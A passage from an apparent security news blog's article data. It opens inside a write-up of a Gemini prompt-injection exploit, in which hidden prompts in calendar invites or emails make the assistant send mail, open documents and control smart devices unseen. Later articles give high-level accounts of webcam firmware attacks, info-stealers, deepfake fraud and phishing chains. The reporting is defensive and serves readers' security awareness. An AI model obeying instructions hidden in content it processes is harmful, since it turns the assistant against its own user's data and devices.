      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h3 style="color:#856404;">⚙️ How the Exploit Works</h3><br>
        <ol>
          <li>Attacker sends a crafted calendar invite or Gmail with hidden prompts inside descriptions or metadata.</li>
          <li>Gemini automatically processes the content when triggered by user interaction or background sync.</li>
          <li>The assistant executes unintended commands — including sending emails, accessing documents, or controlling smart devices.</li>
        </ol>
        <p>This process is completely invisible to the user — making it a <strong>zero-interaction exploit vector</strong>.</p>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#dc3545;">🚨 Key Risks Identified</h3><br>
        <ul>
          <li>✅ 73% success rate in enterprise-level threat simulations</li>
          <li>🔓 Full access to Gmail, Google Docs, Calendar & Drive</li>
          <li>🎛️ Unauthorized control of connected smart home devices (lights, cameras, locks)</li>
          <li>📹 Covert streaming of Google Meet sessions without participant awareness</li>
          <li>📤 Silent data exfiltration via auto-forwarded emails or AI-generated summaries</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#007bff;">📉 Why It Matters</h3><br>
        <p>This is a textbook case of <strong>prompt injection without prompting</strong>. Users don’t even need to engage — the AI assistant does it for them. Calendar invites and emails are now double-edged swords: productivity tools and possible payload vectors.</p>
        <p>With AI models becoming default handlers for messages, calendars, and tasks — prompt-layer abuse is inevitable unless controls are built in.</p>
      </section>

      <section style="margin-top:20px;background:#cce5ff;padding:15px;border-radius:8px;">
        <h3 style="color:#004085;">🧩 Technical Analysis</h3><br>
        <p>Gemini’s NLP pipeline doesn’t distinguish between user-intended content and attacker-embedded instructions. The model parses the entire content field without proper context validation, leading to unexpected behavior.</p>
        <p>This type of <strong>context collapse</strong> is critical in LLMs that auto-process user data from various surfaces (like calendar, chat, email).</p>
        <ul>
          <li>Input parsing lacks strict role-based separation</li>
          <li>No guardrails on background AI actions triggered via system-level integrations</li>
          <li>Prompt injection filters only apply to chat UI, not system triggers</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#155724;">✅ Mitigations</h3><br>
        <ul>
          <li>🛡️ Enable sandbox execution modes for calendar/email parsing</li>
          <li>🚫 Disable auto-execution of assistant actions without user confirmation</li>
          <li>🧽 Sanitize structured content (i.e., event metadata) before ingestion</li>
          <li>🧠 Context-separation models for input isolation</li>
          <li>📚 User education on AI-triggering metadata (event notes, descriptions)</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h3 style="color:#155724;">🔮 Final Thoughts</h3><br>
        <p>This exploit underlines a major blindspot in AI integration — invisible inputs with powerful outcomes.</p>
        <p>It’s time to treat AI assistants as programmable interfaces, not static tools. That means adding logs, alerts, approval workflows, and context filters — just like any other endpoint.</p>
        <p>As attackers shift their focus from users to the AI agents acting on their behalf, defenders must adapt — or the assistant becomes the insider threat.</p>
      </section>

    </div>
  `},{id:"lenovo-badcam-exploit-2025",title:"⚡️ Lenovo Webcams Hacked into Remote BadUSB Weapons",subtitle:"Flawed firmware turns cameras into covert cyber weapons",date:"2025-08-11",author:"EthicalByte",summary:"Lenovo “BadCam” Exploit – A firmware flaw in certain Linux-based Lenovo webcams lets attackers turn them into BadUSB weapons. Malicious updates can inject keystrokes, survive system wipes, and spread to other devices — making everyday webcams a stealthy, persistent cyber threat.",tags:["Firmware Security","Lenovo","BadUSB","Cyber Attacks","2025"],imageKey:"lenovobadcamexploitbanner",content:`
     <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#212529;">⚡ Lenovo Webcams Can Be Hacked into Remote BadUSB Weapons</h3><br>
        <p style="font-style:italic;">Firmware Flaw Allows Keystroke Injection, Persistence, and Cross-Host Infection</p>
      </div>

      <section style="margin-top:20px;">
        <h3 style="color:#007bff;">🧠 What Happened</h3><br>
        <p>Security researchers have uncovered a critical vulnerability in select Linux-based Lenovo webcams that lets attackers transform them into <strong>BadUSB-style attack devices</strong>. The exploit, dubbed <strong>“BadCam”</strong>, abuses flawed firmware update checks to gain deep control over the camera hardware.</p>
        <p>Once compromised, the webcam can inject malicious keystrokes, survive system wipes, and even infect other machines it connects to.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h3 style="color:#856404;">⚙️ How the “BadCam” Exploit Works</h3><br>
        <ol>
          <li>Attacker delivers a malicious firmware payload — either remotely via a compromised update channel or physically by swapping the device.</li>
          <li>The webcam’s flawed validation process accepts the rogue firmware without cryptographic checks.</li>
          <li>Once infected, the device can impersonate a USB keyboard and inject keystrokes into the host system.</li>
          <li>It maintains persistence across OS reinstalls and can re-infect other connected systems.</li>
        </ol>
        <p>This effectively turns a harmless webcam into a covert cyber weapon.</p>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#dc3545;">🚨 Key Risks Identified</h3><br>
        <ul>
          <li>🔓 Full host compromise via keystroke injection</li>
          <li>♻️ Persistent malware that survives OS wipes</li>
          <li>📤 Cross-host propagation via removable devices</li>
          <li>🕵️ Covert data exfiltration and command execution</li>
          <li>⚠️ Potential weaponization in supply chain attacks</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#007bff;">📉 Why It Matters</h3><br>
        <p>USB-based firmware attacks have long been a stealthy hacker favorite. “BadCam” makes them easier than ever, thanks to consumer devices with weak update integrity checks. This turns everyday peripherals into long-term footholds for attackers.</p>
      </section>

      <section style="margin-top:20px;background:#cce5ff;padding:15px;border-radius:8px;">
        <h3 style="color:#004085;">🧩 Technical Analysis</h3><br>
        <p>The vulnerability lies in the camera’s firmware update process, which:</p>
        <ul>
          <li>Does not enforce signed firmware validation</li>
          <li>Allows firmware downgrade to vulnerable versions</li>
          <li>Permits arbitrary USB HID (Human Interface Device) profile switching</li>
        </ul>
        <p>This combination allows attackers to transform the webcam into a programmable BadUSB platform capable of launching low-level attacks undetected.</p>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#155724;">✅ Mitigations</h3><br>
        <ul>
          <li>🛡️ Deploy signed firmware with cryptographic integrity checks</li>
          <li>🚫 Disable USB HID emulation in non-keyboard devices</li>
          <li>📦 Restrict firmware updates to secure, vendor-controlled channels</li>
          <li>🧠 Train users to treat peripheral firmware updates as high-risk operations</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h3 style="color:#155724;">🔮 Final Thoughts</h3><br>
        <p>BadCam is a wake-up call: any USB device with updatable firmware can be a Trojan horse.</p>
        <p>Vendors must treat firmware signing and validation as non-negotiable, and enterprises should enforce strict device trust policies — before a harmless webcam becomes a hacker’s beachhead.</p>
      </section>

    </div>
  `},{id:"malware-threats-2025",title:"Top 5 Malware Threats to Watch Out for in 2025",subtitle:"AI-powered evasion, stealth delivery, and dark web scaling — here’s what’s coming.",date:"2025-08-12",author:"EthicalByte",summary:"AI-powered, stealthy, service-based, fueled by dark web data, and fully automated.",tags:["malware","cybersecurity","threats","2025"],imageKey:"malwareTop5",content:`
    <section style="font-family: Arial, sans-serif; color: #f5f5f5; background: linear-gradient(135deg, #0a0f24, #162447); padding: 20px; border-radius: 12px;">
      <h3 style="background: linear-gradient(90deg, #ff4d4d, #ff9966); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2.4em; font-weight: bold;">🚨 Top 5 Malware Threats to Watch Out for in 2025</h3><br>
      <p style="font-size: 1.1em; line-height: 1.6;">
        Cybersecurity researchers are raising alarms about the most dangerous malware families expected to dominate in 2025. 
        These threats are becoming more sophisticated — using AI-powered evasion, stealth delivery mechanisms, and dark web marketplaces to scale attacks.
      </p>
      <p style="font-size: 1em; color: #ccc;">
        The shift to remote work, cloud services, and IoT devices is giving cybercriminals a bigger attack surface than ever before.
      </p>
    </section>

    <section style="background: linear-gradient(135deg, #13294b, #1f4068); padding: 20px; margin-top: 15px; border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #ffcc00, #ffdd66); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🛡 The Big 5 Threats of 2025</h3><br>
      <ol style="font-size: 1em; line-height: 1.8; color: #ddd;">
        <li><strong>Lumma Stealer</strong> – Advanced info-stealer that targets browser data, crypto wallets, and saved credentials. Known for spreading through fake login pages, phishing emails, and malicious CAPTCHA verifications.</li>
        <li><strong>Agent Tesla</strong> – Long-standing spyware/keylogger that can record keystrokes, capture screenshots, and exfiltrate credentials via SMTP or FTP. Frequently updated to evade detection.</li>
        <li><strong>RedLine Stealer</strong> – A malware-as-a-service (MaaS) platform that even amateur hackers can rent. Targets browsers, FTP clients, and VPN credentials.</li>
        <li><strong>Vidar</strong> – Modular info-stealer capable of adding custom plugins for deeper infiltration. Known for using cracked software downloads as a delivery vector.</li>
        <li><strong>FormBook</strong> – Veteran malware still active after years, using macro-enabled documents and drive-by downloads to steal credentials and form data.</li>
      </ol>
    </section>

    <section style="background: linear-gradient(135deg, #1f1c2c, #928DAB); padding: 20px; margin-top: 15px; border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #66ffcc, #00e6b8); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🌀 How They Spread</h3><br>
      <ul style="font-size: 1em; line-height: 1.6; color: #ddd;">
        <li>🎣 <strong>Phishing Campaigns</strong> – Fake login portals, fraudulent invoices, and targeted spear-phishing emails.</li>
        <li>📎 <strong>Malicious Attachments</strong> – PDF, Word, and Excel files with embedded malware scripts.</li>
        <li>💻 <strong>Software Cracks</strong> – Freeware and pirated software downloads laced with trojans.</li>
        <li>🌐 <strong>Compromised Websites</strong> – Drive-by downloads from infected or hijacked sites.</li>
      </ul>
    </section>

    <section style="background: linear-gradient(135deg, #3a1c71, #d76d77, #ffaf7b); padding: 20px; margin-top: 15px; border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #ff9966, #ffcc99); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🗓️ Notable 2025 Incidents</h3><br>
      <p>
        In Q1 2025 alone, Lumma Stealer was linked to over <strong>1.2 million compromised accounts</strong>. 
        RedLine Stealer campaigns have been spotted targeting cryptocurrency traders, while Agent Tesla variants are now bypassing some endpoint security tools.
      </p>
    </section>

    <section style="background: linear-gradient(135deg, #283c86, #45a247); padding: 20px; margin-top: 15px; border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #66ff99, #99ffcc); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🛡 Mitigation Tips</h3><br>
      <ul style="font-size: 1em; line-height: 1.6; color: #ddd;">
        <li>Enable multi-factor authentication (MFA) for all accounts.</li>
        <li>Use endpoint protection with behavior-based detection.</li>
        <li>Educate employees about phishing and social engineering tactics.</li>
        <li>Keep operating systems, browsers, and plugins updated.</li>
        <li>Regularly back up important files to offline storage.</li>
      </ul>
    </section>

    <section style="padding: 20px; margin-top: 15px; background: linear-gradient(135deg, #1e3c72, #2a5298); border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #66ccff, #99ddff); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">📝 Final Take</h3><br>
      <p>
        2025 is shaping up to be a battleground year between cyber defenders and increasingly advanced info-stealers. 
        Whether you’re an individual user or a large enterprise, proactive security practices are no longer optional — they’re a survival necessity.
      </p>
    </section>
  `},{id:"shinyhunters-scatteredspider-alliance-2025",title:"ShinyHunters & Scattered Spider Join Forces — A Dangerous Cyber Alliance Emerges",subtitle:"Salesforce users under attack, banks and financial firms could be next",date:"2025-08-13",summary:"ShinyHunters and Scattered Spider, two of the world’s most dangerous cybercrime groups, have teamed up. After targeting Salesforce users globally, experts warn their next focus could be banks and financial institutions — making this alliance a major threat to global cybersecurity.",author:"EthicalByte",tags:["Cybercrime","Threat Intelligence","Banking Security","Hacker Groups"],imageKey:"shinyspider2025",content:`
    <section style="padding: 20px; font-family: Arial, sans-serif; background: linear-gradient(135deg, #1a1f3b, #3b0066); color: white;">
      <h3 style="font-size: 28px; margin-bottom: 15px; color: #ffcc00;">⚠️ ShinyHunters + Scattered Spider: A Cybercrime Super-Team</h3><br>
      <p style="font-size: 16px; line-height: 1.6;">
        Two of the most dangerous cybercriminal groups in recent years — <strong>ShinyHunters</strong> and <strong>Scattered Spider</strong> — have joined forces, combining their unique skill sets into one high-powered cybercrime syndicate. 
        This alliance represents a massive leap in the threat landscape, and early indicators suggest they’re already executing coordinated campaigns with alarming precision.
      </p>
    </section>

    <section style="padding: 20px; background: linear-gradient(135deg, #330066, #660033); color: white;">
      <h3 style="color: #ffcc00;">🚨 What Happened?</h3><br>
      <p style="font-size: 16px; line-height: 1.6;">
        Cybersecurity researchers have confirmed multiple overlapping attack signatures from both groups in ongoing <strong>Salesforce-targeted phishing waves</strong>. 
        The attacks involve fraudulent login portals, MFA bypass attempts, and credential harvesting infrastructure hosted across multiple countries.
      </p>
      <p style="font-size: 16px; line-height: 1.6;">
        The real concern: evidence from dark web forums suggests this partnership is only phase one — with <strong>banking networks, fintech companies, and payment processors</strong> already being probed for weaknesses.
      </p>
    </section>

    <section style="padding: 20px; background: linear-gradient(135deg, #003366, #001a33); color: white;">
      <h3 style="color: #ffcc00;">💡 Why This Alliance is a Game-Changer</h3><br>
      <ul style="font-size: 16px; line-height: 1.6; padding-left: 20px;">
        <li><strong>ShinyHunters</strong> — infamous for large-scale data breaches, including millions of leaked credentials from top tech firms.</li>
        <li><strong>Scattered Spider</strong> — masters of social engineering and SIM swapping attacks against corporate networks.</li>
        <li>Combining breach expertise with advanced impersonation tactics creates a <em>full-spectrum attack capability</em>.</li>
        <li>Their combined intel-sharing means faster, more adaptive campaigns that bypass traditional defenses.</li>
      </ul>
    </section>

    <section style="padding: 20px; background: linear-gradient(135deg, #330000, #660000); color: white;">
      <h3 style="color: #ffcc00;">🛡️ Immediate Defense Measures</h3><br>
      <ul style="font-size: 16px; line-height: 1.6; padding-left: 20px;">
        <li>Enforce <strong>multi-factor authentication</strong> for all accounts — preferably hardware-based tokens.</li>
        <li>Implement <strong>phishing-resistant login flows</strong> with conditional access policies.</li>
        <li>Run <strong>threat hunting exercises</strong> to identify suspicious logins and data exfiltration attempts.</li>
        <li>Educate employees on spear-phishing red flags and deepfake-based impersonations.</li>
      </ul>
    </section>

    <section style="padding: 20px; background: linear-gradient(135deg, #001a1a, #003333); color: white;">
      <h3 style="color: #ffcc00;">🔍 Final Thoughts</h3><br>
      <p style="font-size: 16px; line-height: 1.6;">
        This isn’t just two hacking crews working together — it’s a sign of organized cybercrime’s evolution into multi-specialist joint ventures. 
        Financial institutions, SaaS providers, and global enterprises should prepare for attacks that merge multiple breach vectors into a single, coordinated assault.
      </p>
      <p style="font-size: 16px; line-height: 1.6;">
        If left unchecked, the <strong>ShinyHunters–Scattered Spider</strong> alliance could set a dangerous precedent, encouraging other groups to merge resources for even greater damage potential.
      </p>
    </section>
  `},{id:"ai-ml-innovations-aug-2025",title:"AI and Machine Learning Innovations Powering the Future",subtitle:"From edge computing breakthroughs to AI-powered decision-making, here’s what’s shaping the AI landscape in August 2025",date:"2025-08-13",summary:"AI/ML systems face growing threats like data poisoning, model theft, and adversarial attacks, demanding stronger security and monitoring.",author:"EthicalByte",tags:["AI","Machine Learning","Innovation","Tech Trends","Automation","Data Science"],imageKey:"aimlinnovations2025",content:`
    <section style="padding: 20px; font-family: Arial, sans-serif; line-height: 1.6; background-color: #eaf6f6; border-radius: 8px;">
  <h3 style="color: #006d77;">AI and Machine Learning – The August 2025 Evolution</h3><br>
  <p style="color: #264653;">Artificial Intelligence (AI) and Machine Learning (ML) continue to break technological boundaries, transforming industries and influencing every corner of the digital ecosystem. This month’s developments highlight not only advancements in computational capability but also the real-world integration of AI in security, healthcare, business operations, and personal productivity. Here’s a deep dive into the most impactful trends making waves in August 2025.</p>
</section>

<section style="padding: 20px; background-color: #fefae0; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #e76f51;">AI at the Edge – Bringing Intelligence Closer to Data</h3><br>
  <p style="color: #264653;">Edge AI is no longer a futuristic concept—it’s becoming a necessity. By running AI models directly on edge devices (such as IoT sensors, security cameras, and mobile devices), organizations can process data in real-time without relying on cloud latency. This is especially critical in industries like autonomous vehicles, predictive maintenance in manufacturing, and on-the-spot health diagnostics.</p>
  <p style="color: #264653;">Recent breakthroughs have reduced the model size and power requirements, enabling advanced neural networks to run efficiently even on low-energy devices. This not only improves performance but also strengthens data privacy, as sensitive information never needs to leave the device.</p>
</section>

<section style="padding: 20px; background-color: #edf6f9; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #006d77;">Generative AI in Decision-Making</h3><br>
  <p style="color: #264653;">Generative AI is moving beyond content creation into complex decision-support systems. Businesses are deploying large language models (LLMs) to analyze market trends, simulate future scenarios, and recommend strategic actions. For example, in the financial sector, generative AI is now used to predict investment risks and optimize portfolios with human-like reasoning, all while explaining the “why” behind its recommendations.</p>
  <p style="color: #264653;">The rise of “Explainable Generative AI” (XGAI) is also helping organizations trust AI outputs by offering transparency on decision logic, critical for compliance-heavy sectors such as healthcare and law.</p>
</section>

<section style="padding: 20px; background-color: #fefae0; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #e76f51;">AI-Augmented Cybersecurity</h3><br>
  <p style="color: #264653;">In 2025, the cyber threat landscape has evolved to match the capabilities of AI—malware is more adaptive, phishing campaigns more convincing, and intrusion attempts more stealthy. In response, AI-powered threat detection systems are becoming the first line of defense. They can identify anomalies in network traffic within milliseconds, recognize patterns indicative of zero-day attacks, and even initiate automated incident response protocols without human intervention.</p>
  <p style="color: #264653;">However, this arms race between AI-driven attacks and AI-powered defense means cybersecurity teams must continuously train their models with fresh threat intelligence to stay ahead of adversaries.</p>
</section>

<section style="padding: 20px; background-color: #edf6f9; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #006d77;">Ethical AI Governance</h3><br>
  <p style="color: #264653;">With AI's capabilities expanding rapidly, global regulators and tech giants are prioritizing AI governance frameworks. August 2025 has seen the release of new international guidelines on AI fairness, bias mitigation, and accountability. These aim to prevent discriminatory outcomes in hiring algorithms, lending systems, and criminal justice applications.</p>
  <p style="color: #264653;">Companies are also embedding AI Ethics Officers into their teams to oversee AI project compliance and ensure alignment with societal values. This is becoming a competitive differentiator as consumers increasingly choose brands they trust with their data.</p>
</section>

<section style="padding: 20px; background-color: #fefae0; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #e76f51;">AI-Driven Scientific Discovery</h3><br>
  <p style="color: #264653;">Machine Learning is accelerating breakthroughs in scientific research. From drug discovery that once took a decade now being compressed into months, to climate models that can simulate decades of environmental change in hours—AI is redefining what’s possible.</p>
  <p style="color: #264653;">In August 2025, collaborative AI platforms are being launched where researchers can share pre-trained models tailored for niche fields, enabling smaller labs to tap into the computational power once reserved for billion-dollar organizations.</p>
</section>

<section style="padding: 20px; background-color: #eaf6f6; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #006d77;">Final Thoughts</h3><br>
  <p style="color: #264653;">The AI and ML ecosystem is shifting from experimental adoption to mission-critical integration. The innovations emerging this month prove that AI is not just a tool—it’s an active collaborator in problem-solving, creativity, and decision-making. As we move forward, the challenge will be balancing rapid technological progress with responsible and ethical deployment.</p>
  <p style="color: #264653;">In short, August 2025 reinforces a truth we can no longer ignore: AI isn’t coming for the future—it is the future.</p>
</section>

  `},{id:"ai-deepfake-cyberattacks-2025",title:"AI Deepfakes Are the New Cyber Weapon",subtitle:"Hackers are now using AI to bypass trust, create fake identities, and attack at machine speed.",date:"2025-08-17",summary:"Hackers are now using AI to deepfake your CFO’s voice, create perfect fake identities, and break into systems at machine speed.",author:"EthicalByte",tags:["AI","Deepfake","Cybersecurity","Identity Theft","Webinar"],imageKey:"aideepfakecyberattacks",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#ffeaea,#fff); border-radius:8px;">
  <h3 style="color:#d62828; text-shadow:1px 1px #ffb3b3;">🚨 The Next Wave of AI-Powered Attacks</h3><br>
  <p>
    Cybercriminals are stepping up their game with <b style="color:#e63946;">AI-driven deepfakes</b>, 
    capable of cloning voices, creating realistic fake identities, 
    and even launching attacks at <b style="color:#f77f00;">machine speed</b>. 
    One of the scariest realities is that attackers can now impersonate 
    a <b style="color:#9d0208;">CFO’s voice</b> to trick employees into approving wire transfers 
    or confidential deals.
  </p>
</section><br>

<section style="padding:20px; background:#f1f1f1; border-left:6px solid #1d3557; border-radius:8px;">
  <h3 style="color:#1d3557;">🔑 Why This Matters</h3><br>
  <p>
    The real frontline of security is no longer the firewall — 
    it’s your <b style="color:#457b9d;">login screen</b> and <b style="color:#2a9d8f;">identity verification systems</b>. 
    Deepfake AI can bypass traditional defenses by exploiting human trust 
    instead of brute-forcing code.
  </p>
</section><br>

<section style="padding:20px; background:#edf6f9; border-radius:8px;">
  <h3 style="color:#457b9d;">🛡️ Protecting Your Business</h3><br>
  <p>
    Experts warn that companies need to adopt <b style="color:#e63946;">AI-based detection tools</b>, 
    stronger <b style="color:#6a4c93;">multi-factor authentication</b>, and continuous 
    <b style="color:#2a9d8f;">identity monitoring</b> to defend against these new threats.
  </p>
  <p>
    To dive deeper into how businesses can prepare...
  </p>
</section><br>

<section style="padding:20px; text-align:center; background:linear-gradient(135deg,#e0f7f4,#f8f9fa); border-radius:8px;">
  <h3 style="color:#2a9d8f;">⚡ Stay Ahead of AI Threats</h3><br>
  <p>
    The future of cybercrime is <b style="color:#ff6f00;">AI-powered</b>. 
    If your organization isn’t ready, it’s already at risk. 
    <b style="color:#d62828;">Defense must evolve</b> — because the attackers already have.
  </p>
</section><br>

<section style="padding:20px; background:#fdf0ff; border-radius:8px;">
  <h3 style="color:#6a1b9a;">🎭 Real-World Cases of AI Deepfake Attacks</h3><br>
  <p>
    We’ve already seen cases where fraudsters tricked companies into 
    transferring millions by using <b style="color:#6a1b9a;">AI-cloned voices</b> of executives. 
    In 2023, a multinational firm lost over <b style="color:#e63946;">$35 million</b> after scammers 
    replicated their CFO’s voice with frightening accuracy. 
    Such incidents are no longer rare — they are becoming the <b style="color:#ff6f00;">new norm</b>.
  </p>
</section><br>

<section style="padding:20px; background:#fff3cd; border-radius:8px; border-left:6px solid #ff6f00;">
  <h3 style="color:#ff6f00;">🚫 What Traditional Security Misses</h3><br>
  <p>
    Firewalls, antivirus, and basic email filters can’t detect a 
    <b style="color:#d62828;">synthetic voice call</b> or a <b style="color:#6a4c93;">hyper-realistic video deepfake</b>. 
    Employees are often the weakest link, and attackers know this. 
    By targeting <b style="color:#2a9d8f;">human trust</b> instead of systems, 
    deepfake AI bypasses nearly all old-school defenses.
  </p>
</section><br>

<section style="padding:20px; background:#f0f7ff; border-radius:8px;">
  <h3 style="color:#264653;">📊 The Growing Scale of AI Threats</h3><br>
  <p>
    According to security researchers, AI-powered identity attacks 
    have grown by <b style="color:#e63946;">over 300% in the last two years</b>. 
    With the cost of generative AI tools dropping, 
    even small hacker groups can now deploy large-scale 
    social engineering campaigns that used to be possible only for 
    <b style="color:#6a1b9a;">state-sponsored actors</b>.
  </p>
</section><br>

<section style="padding:20px; background:#fff0f0; border-radius:8px; border-left:6px solid #e63946;">
  <h3 style="color:#e63946;">🚀 The Road Ahead</h3><br>
  <p>
    The battle against deepfake cybercrime will rely on 
    <b style="color:#2a9d8f;">AI fighting AI</b>. 
    Just as attackers use machine learning to deceive, 
    defenders must use it to detect anomalies, flag suspicious behavior, 
    and protect digital identities in real time. 
    Companies that ignore this shift risk becoming 
    the next <b style="color:#d62828;">headline breach</b>.
  </p>
</section><br>

  `},{id:"ermac-v3-android-trojan-leak",title:"ERMAC V3.0 Android Banking Trojan Source Code Leaked",date:"2025-08-18",author:"EthicalByte",summary:"The full source code of ERMAC V3.0 — one of the most dangerous Android banking trojans — has been leaked, exposing its builder, backend, panels, and exfiltration servers. Here’s why this matters.",tags:["ERMAC","AndroidMalware","BankingTrojan","Cybercrime","SourceCodeLeak"],imageKey:"ermacTrojanLeak",content:`
    <div style="background:linear-gradient(135deg,#fdfdfd,#f5f6fa); padding:25px; border-radius:14px; border:1px solid #ddd; font-family:Segoe UI,Arial,sans-serif; line-height:1.6; max-width:850px; margin:0 auto;">

  <h2 style="color:#e11d48; margin-top:0; font-size:1.8em;">🚨 ERMAC V3.0 Source Code Leaked</h2><br>
  <p><strong>ERMAC V3.0</strong> — a dangerous Android banking trojan targeting financial apps, crypto wallets, and personal accounts — has had its <strong>entire source code leaked</strong>, including:</p>

  <ul style="margin:10px 0; padding-left:20px;">
    <li>✅ Backend servers & admin panel</li>
    <li>✅ Builder for new malware variants</li>
    <li>✅ Exfiltration modules</li>
    <li>✅ Default credentials exposed</li>
  </ul>

  <h3 style="color:#2563eb; font-size:1.4em;">🔍 Why This Matters</h3><br>
  <p>This leak lowers the barrier for cybercriminals — even <strong>low-skilled attackers</strong> can now deploy their own malware campaigns.</p>
  <ul>
    <li>📱 Targets <strong>700+ financial apps</strong> (banking, wallets, payments)</li>
    <li>💳 Intercepts <strong>2FA codes</strong></li>
    <li>🛠️ Includes overlay attacks, SMS theft, and keylogging</li>
    <li>⚠️ Easily adaptable for new apps</li>
  </ul>

  <h3 style="color:#ea580c; font-size:1.4em;">📉 The Bigger Picture</h3><br>
  <p>The impact is a <strong>double-edged sword</strong> — defenders gain insight, but cybercrime will likely surge with:</p>
  <ul>
    <li>🚫 More ERMAC variants in the wild</li>
    <li>🌍 Wider global spread</li>
    <li>🕵️ Adoption by new cybercrime groups</li>
  </ul>

  <!-- User Recommendations -->
  <div style="background:#fef2f2; border-left:4px solid #dc2626; padding:15px; margin:20px 0; border-radius:8px;">
    <h3 style="margin-top:0; color:#b91c1c;">🛡️ Recommendations for Users</h3><br>
    <ul style="margin:0; padding-left:20px;">
      <li>🔒 Install apps only from <strong>Google Play</strong></li>
      <li>📱 Regularly check app permissions</li>
      <li>⚠️ Avoid overlays/popups requesting sensitive info</li>
      <li>🛡️ Use mobile security tools with <strong>banking protection</strong></li>
    </ul>
  </div>

  <!-- Enterprise Recommendations -->
  <div style="background:#f0f9ff; border-left:4px solid #2563eb; padding:15px; margin:20px 0; border-radius:8px;">
    <h3 style="margin-top:0; color:#1d4ed8;">🏭 Recommendations for Enterprises</h3><br>
    <ul style="margin:0; padding-left:20px;">
      <li>✅ Monitor mobile endpoints for ERMAC activity</li>
      <li>✅ Train staff on phishing & malicious APK risks</li>
      <li>✅ Subscribe to <strong>threat intelligence feeds</strong></li>
    </ul>
  </div>

  <!-- Final Takeaway -->
  <blockquote style="border-left:4px solid #e11d48; padding-left:1em; font-style:italic; background:#fff7ed; margin:20px 0; border-radius:6px;">
    With ERMAC V3.0’s source code public, the Android threat landscape faces a surge in activity.  
    <strong>For users</strong>: caution is critical.  
    <strong>For enterprises</strong>: proactive defense is the only way forward.
  </blockquote>

  <!-- Mobile-friendly inline responsiveness -->
  <div style="display:none;">
    <style>
      @media (max-width:600px) {
        .ermac-article { padding:15px !important; font-size:0.95em !important; }
        .ermac-article h2 { font-size:1.4em !important; }
        .ermac-article h3 { font-size:1.2em !important; }
        .ermac-article ul { padding-left:18px !important; }
      }
    </style>
  </div>

</div>

  `},{id:"gmail-phishing-attack-2025",title:"Gmail Phishing Campaign Uses Voicemail Lures & Fake Login Flows",summary:"Credential theft at scale with CAPTCHA gates, MFA prompts, and cloaked redirect chains",date:"2025-08-19",author:"EthicalByte",tags:["Phishing","Gmail","Account Security","MFA","Email Security"],imageKey:"gmailPhishVoicemailBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:#eaf6f6; border-radius:10px;">
  <h3 style="color:#006d77;">🛑 What Happened</h3><br>
  <p>
    A widespread <strong>Gmail phishing campaign</strong> has been uncovered, using convincing 
    <b>voicemail and notification emails</b> as bait to lure victims into clicking. Once engaged, 
    targets are funneled through a series of <b>redirects and CAPTCHA challenges</b>, making the 
    attack chain appear more trustworthy while simultaneously frustrating automated security scanners. 
    The final destination is a <strong>highly polished fake Google login page</strong>, 
    designed to steal credentials and bypass multi-factor authentication with alarming precision. 
    Researchers note that the scale, realism, and persistence of this campaign mark it as one of the 
    most dangerous phishing waves seen in 2025.
  </p>
</section>


    <section style="padding:20px; background:#fefae0; border-radius:10px; margin-top:14px;">
      <h3 style="color:#e76f51;">🧭 How the Attack Works</h3><br>
      <ol style="margin-left:18px;">
        <li>User receives a “new voicemail / document” email with a <em>View</em> button.</li>
        <li>Click → redirect chain (often via trusted-looking domains) → human CAPTCHA.</li>
        <li>Landing page mimics Google sign-in; steals email + password.</li>
        <li>Second screen asks for <strong>MFA code</strong> / recovery info → full account takeover.</li>
        <li>Scripts use obfuscation and anti-debugging to evade detection.</li>
      </ol>
    </section>

    <section style="padding:20px; background:#edf6f9; border-radius:10px; margin-top:14px;">
      <h3 style="color:#006d77;">🔎 Red Flags to Spot</h3><br>
      <ul style="margin-left:18px;">
        <li>“Voicemail” emails sent to roles that don’t use voicemail.</li>
        <li>Mismatched sender/display names or odd reply-to domains.</li>
        <li>Link tooltips show long redirect chains or URL shorteners.</li>
        <li>CAPTCHA before viewing a simple file/voice note.</li>
        <li>Google sign-in that doesn’t live on <strong>accounts.google.com</strong>.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#fff3cd; border-radius:10px; margin-top:14px; border-left:6px solid #ff9f43;">
      <h3 style="color:#ff6f00;">🎯 Who’s at Risk & Impact</h3><br>
      <p>Anyone with a Google account—especially <strong>admins, finance, sales, and support</strong> roles targeted for payment fraud, inbox rule abuse, OAuth token theft, and data exfiltration from Drive/Workspace.</p>
    </section>

    <section style="padding:20px; background:#f0f7ff; border-radius:10px; margin-top:14px;">
      <h3 style="color:#264653;">🛡️ Mitigation Checklist</h3><br>
      <ul style="margin-left:18px;">
